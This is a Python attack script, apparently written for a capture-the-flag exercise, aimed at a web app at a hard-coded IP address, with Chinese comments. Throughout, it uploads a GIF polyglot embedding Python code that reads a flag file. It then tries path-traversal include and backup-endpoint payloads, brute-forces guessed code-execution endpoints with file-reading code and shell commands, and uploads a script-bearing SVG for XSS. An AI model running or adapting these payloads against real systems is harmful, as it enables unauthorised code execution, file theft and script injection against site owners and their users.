import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("上传并尝试执行Python代码")
print("="*70)

# 获取上传页面和CSRF
r = session.get(f"{TARGET}/upload", timeout=15)
csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""

print(f"CSRF Token: {csrf}")

# 创建包含Python代码的GIF文件
gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'

# Python代码：尝试读取flag文件并输出
python_code = b"""
import os
try:
    with open('F:/flag.txt', 'r') as f:
        print('FLAG_CONTENT:', f.read())
except Exception as e:
    print('ERROR:', str(e))
"""

malicious_gif = gif_header + python_code

# 上传文件
files = {"file": ("exploit.gif", malicious_gif, "image/gif")}
data = {"csrf": csrf}

r = session.post(f"{TARGET}/upload", files=files, data=data, timeout=15)
print(f"\n上传状态码: {r.status_code}")
print(f"响应: {r.text[:800]}")

# 提取上传路径
upload_match = re.search(r'/uploads/[a-zA-Z0-9_.-]+', r.text)
if upload_match:
    uploaded_path = upload_match.group(0)
    uploaded_url = f"{TARGET}{uploaded_path}"
    print(f"\n上传文件URL: {uploaded_url}")
    
    # 1. 尝试直接访问
    print("\n" + "="*70)
    print("1. 直接访问上传文件")
    print("="*70)
    
    r = session.get(uploaded_url, timeout=15)
    print(f"状态码: {r.status_code}")
    print(f"内容: {r.text[:500]}")
    
    # 2. 尝试通过include包含
    print("\n" + "="*70)
    print("2. 通过文件包含执行")
    print("="*70)
    
    include_payloads = [
        uploaded_path.lstrip('/'),
        f"../{uploaded_path.lstrip('/')}",
        f"../../{uploaded_path.lstrip('/')}",
        f"F:/small peoject/python-lab{uploaded_path.replace('/', '\\')}",
        uploaded_path.lstrip('/').replace('.gif', ''),
        uploaded_path.lstrip('/').replace('.gif', '.py'),
    ]
    
    for payload in include_payloads:
        try:
            r = session.get(f"{TARGET}/include", params={"page": payload}, timeout=15)
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n>>> include?page={payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
        except:
            pass
    
    # 3. 尝试通过backup读取
    print("\n" + "="*70)
    print("3. 通过Backup读取并执行")
    print("="*70)
    
    backup_payloads = [
        f"F:/small peoject/python-lab{uploaded_path.replace('/', '\\')}",
        f"F:/small peoject/python-lab/uploads",
    ]
    
    for payload in backup_payloads:
        try:
            r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=15)
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1).strip()
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n>>> backup?path={payload}")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                        exit(0)
        except:
            pass

# 4. 尝试寻找代码执行API
print("\n" + "="*70)
print("4. 寻找代码执行API")
print("="*70)

exec_paths = [
    "/run",
    "/exec",
    "/eval",
    "/execute",
    "/api/run",
    "/api/exec",
    "/api/execute",
    "/run-code",
    "/run_code",
    "/execute-code",
    "/execute_code",
    "/eval-code",
    "/eval_code",
    "/run_python",
    "/run-python",
    "/runpy",
    "/execpy",
    "/python",
    "/py",
    "/code",
    "/shell",
    "/cmd",
    "/command",
    "/terminal",
    "/console",
]

for path in exec_paths:
    try:
        r = session.get(f"{TARGET}{path}", timeout=10)
        if r.status_code == 200 and len(r.text) > 100:
            print(f"\n>>> {path}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:300]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 5. 尝试POST到可能的代码执行API
print("\n" + "="*70)
print("5. POST到可能的代码执行API")
print("="*70)

for path in exec_paths:
    try:
        data = {"code": "print(open('F:/flag.txt').read())", "cmd": "type F:/flag.txt", "python": "print(open('F:/flag.txt').read())"}
        r = session.post(f"{TARGET}{path}", data=data, timeout=10)
        if r.status_code == 200 and len(r.text) > 50:
            print(f"\n>>> POST {path}")
            print(f"状态码: {r.status_code}")
            print(f"内容: {r.text[:500]}")
            
            flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    except:
        pass

# 6. 尝试上传SVG（可能触发XSS或SSRF）
print("\n" + "="*70)
print("6. 测试SVG上传")
print("="*70)

# 重新获取CSRF
r = session.get(f"{TARGET}/upload", timeout=15)
csrf_match = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
csrf = csrf_match.group(1) if csrf_match else ""

svg_content = b'''<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <script>alert('xss')</script>
  <text x="0" y="15" fill="black">SVG Test</text>
</svg>'''

files = {"file": ("test.svg", svg_content, "image/svg+xml")}
data = {"csrf": csrf}

r = session.post(f"{TARGET}/upload", files=files, data=data, timeout=15)
print(f"上传SVG状态码: {r.status_code}")
print(f"响应: {r.text[:500]}")

print("\n测试完成")
